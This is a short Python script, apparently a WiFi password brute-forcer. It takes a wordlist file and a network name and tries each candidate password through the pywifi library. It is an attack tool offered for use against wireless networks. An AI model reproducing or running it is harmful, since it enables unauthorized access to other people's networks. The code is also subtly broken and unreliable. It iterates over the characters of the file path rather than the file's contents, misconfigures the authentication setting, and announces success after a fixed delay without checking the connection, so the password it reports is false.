import time
from pywifi import PyWiFi
import tkinter as tk
from tkinter import filedialog

def get_file_path():
    root = tk.Tk()
    root.withdraw()
    file_path = filedialog.askopenfilename()

    return file_path

def connect_to_wifi(ssid, password):
    
    for i in password:
        try:
            wifi = PyWiFi()
            iface = wifi.interfaces()[0]
    
            profile = iface.add_network_profile()
            profile.ssid = ssid
            profile.key = i
            profile.akm.append(iface.auth_alg_open)
    
            iface.connect(profile)
            time.sleep(4)
            print(f"Success, wifi password is: {i}")
            break 
        except Exception as e:
            print(f"{i} Is not the password")

if __name__ == "__main__":
    wordlist = get_file_path()

    ssid = input('wifi name: ')

    connect_to_wifi(ssid, wordlist)

